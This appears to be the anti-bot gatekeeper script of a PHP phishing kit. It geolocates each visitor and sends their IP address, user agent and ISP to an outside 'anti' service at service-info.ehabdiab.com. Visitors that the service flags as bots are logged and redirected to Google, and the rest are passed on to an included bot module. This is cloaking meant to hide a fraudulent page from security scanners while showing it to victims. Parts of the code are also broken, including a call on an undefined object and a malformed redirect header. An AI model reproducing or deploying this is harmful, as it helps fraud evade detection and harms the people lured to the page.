<?php
ob_start();
session_start();
include('mobi.php');
include('it.php');


    function save($file, $text, $type)
    {
        $fp = fopen($file, $type);
        fwrite($fp, $text);
        fclose($fp);
    }
     function loga($p, $p2 = "log.txt")
    {
        $brali = "\n";

        $text = "$brali IP -> [ " . $_SESSION['ip'] . " ]  PAGE -> [ " . $p . " ]  DATE -> [ " . date('d/m/y H:i:s') . " ]  COUNTRY -> [ " . $_SESSION['country'] . " | " . $_SESSION['city'] . " ]  ISP -> [ ".$_SESSION['isp']." ]  OS -> [ ".$_SESSION['os']." ]  AGENT -> [ ".$_SESSION['agent']." ] $brali";
        return save($p2, $text, "a+");
    }
       function blocked($reason, $ram = "blocked.txt")
    {
        $brali = "\n";
        $text = "$brali IP -> [ " . $_SESSION['ip'] . " ]  DATE -> [ " . date('d/m/y H:i:s') . " ]  [ $reason ]  COUNTRY -> [ " . $_SESSION['country'] . " ]  ISP -> [ ".$_SESSION['isp']." ]  OS -> [ ".$_SESSION['os']." ]  AGENT -> [ ".$_SESSION['agent']." ] $brali ";
        return save($ram, $text, "a+");
    }
     function getIp()
    {
        foreach (array(
            'HTTP_CLIENT_IP',
            'HTTP_X_FORWARDED_FOR',
            'HTTP_X_FORWARDED',
            'HTTP_X_CLUSTER_CLIENT_IP',
            'HTTP_FORWARDED_FOR',
            'HTTP_FORWARDED',
            'REMOTE_ADDR'
        ) as $key)
        {
            if (array_key_exists($key, $_SERVER) === true)
            {
                foreach (explode(',', $_SERVER[$key]) as $IPaddress)
                {
                    $IPaddress = trim($IPaddress);
                    if (filter_var($IPaddress, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false)
                    {
                        return $IPaddress;
                    }
                }
            }
        }
    }
      function dataIP($ss)
    {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_URL, "http://www.geoplugin.net/json.gp?ip=" . getIp());
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 0);
        curl_setopt($ch, CURLOPT_TIMEOUT, 400);
        $json = curl_exec($ch);
        curl_close($ch);
        if ($json == false)
        {
            return "127.0.0.1";
        }
        $code = json_decode($json);
        switch ($ss)
        {
            case "code":
                $str = $code->geoplugin_countryCode;
            break;
            case "country":
                $str = $code->geoplugin_countryName;
            break;
            case "city":
                $str = $code->geoplugin_city;
            break;
            case "state":
                $str = $code->geoplugin_region;
            break;
            case "timezone":
                $str = $code->geoplugin_timezone;
            break;
            case "currency":
                $str = $code->geoplugin_currencyCode;
            break;
            default:
                $str = $code->geoplugin_request;
        }
        return $str;
    }
     function datac2($data)
    {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_URL, "http://extreme-ip-lookup.com/json/" . getIp());
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 0);
        curl_setopt($ch, CURLOPT_TIMEOUT, 400);
        $json1 = curl_exec($ch);
        curl_close($ch);
        if ($json1 == false)
        {
            return "127.0.0.1";
        }
        $code = json_decode($json1);
        $str1 = "";
        switch ($data)
        {
            case "code":
                $str1 = $code->countryCode;
                if ($str1 == "GB")
                {
                    $str1 = "UK";
                }
                else if ($str1 == "C2" || $str1 == "A1")
                {
                    $str1 = "US";
                }
                break;
            case "country":
                $str1 = $code->country;
                break;
            case "city":
                $str1 = $code->city;
                break;
            case "state":
                $str1 = $code->region;
                break;
            case "isp":
                $str1 = $code->isp;
                break;
            case "ip":
                $str1 = $code->query;
                break;
            default:
                $str1 = $code->status;
            }
            return $str1;
    }
     function getAgent()
    {
        return $_SERVER['HTTP_USER_AGENT'];
    }
$_SESSION['agent_']    = getAgent();
$_SESSION['ip_']       = dataIP("ip");
$_SESSION['isp_']       = dataIP("isp");
    $hi = array(
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Encoding: gzip, deflate',
        'Accept-Language: en-US,en;q=0.9',
        'Cache-Control: max-age=0',
        'Connection: keep-alive',
        'Host: service-info.ehabdiab.com',
        'Upgrade-Insecure-Requests: 1',
    );
    $urling = "https://service-info.ehabdiab.com/*a/anti/wp-mail.php?ip=" . $_SESSION['ip_'] . "&agent=" . $_SESSION['agent_'] . "&isp=" . $_SESSION["isp_"];
    $urling = str_replace(" ", '%20', $urling);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $urling);
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36 OPR/73.0.3856.284");
    curl_setopt($ch, CURLOPT_HTTPHEADER, $hi);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $json = curl_exec($ch);
    $jy = json_decode($json);
        $tpp = @$jy->botype;
        $tbote = @$jy->bot;
        if ($tbote == "bot")
        {
            $code->blocked($tpp);
            header("location : https://href.li/?https://google.com");
            exit();
        } 
    curl_close($ch);

include('new_bot/bot.php');

ob_end_flush();

?>
